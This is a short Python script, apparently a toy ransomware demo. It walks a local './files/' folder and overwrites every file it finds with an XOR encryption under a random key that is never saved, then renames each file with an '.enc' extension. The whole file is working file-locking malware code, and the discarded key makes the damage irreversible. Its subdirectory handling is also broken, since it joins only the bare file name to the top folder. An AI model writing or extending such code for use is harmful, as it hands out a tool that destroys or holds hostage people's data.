import os
from itertools import cycle


TARGET_DIR = "./files/"

def encrypt(filename, key):
    orig_bytes = None
    encrypted_bytes = bytearray()
    with open(TARGET_DIR + filename, "rb") as f:
        orig_bytes = bytearray(f.read() )
    encrypted_bytes = bytes(a ^ b for a, b in zip(orig_bytes, cycle(key)))

    with open(TARGET_DIR + filename, "wb") as f:
        f.write(encrypted_bytes)

    os.rename(TARGET_DIR + filename, TARGET_DIR + filename + ".enc")

    print(f"[+] Encrypted {TARGET_DIR + filename}")


if __name__=="__main__":
    key = os.urandom(16)
    for subdir, dirs, files in os.walk(TARGET_DIR):
        for file in files:
            print(f"file name: {file}")
            encrypt(file, key)
